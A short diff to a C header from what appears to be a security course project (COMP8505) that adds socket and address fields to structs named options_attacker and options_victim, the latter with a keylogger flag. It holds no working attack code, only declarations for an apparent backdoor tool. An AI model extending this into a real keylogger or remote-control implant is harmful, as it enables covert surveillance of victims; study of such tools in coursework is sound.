@@ -29,8 +29,14 @@ struct options_attacker {
     char file_info[S_ARR_SIZE];
     char file_name[S_ARR_SIZE];
     int file_size;
-    int temp_file_size;
+    char* data;
+    int size;
     bool file_flag;
+
+    int rtcp_socket;
+    struct sockaddr_in rtcpsa;
+    struct sockaddr_in mtcpsa;
+
 };
 
 
@@ -48,6 +54,11 @@ struct options_victim {
     bool ip_flag;
     bool keylogger;
     bool target;
+
+    int rtcp_socket;
+    int atcp_socket;
+    struct sockaddr_in rtcpsa;
+    struct sockaddr_in ctcpsa;
 };
 
 #endif //COMP8505_PROJECT_OPTIONS_H
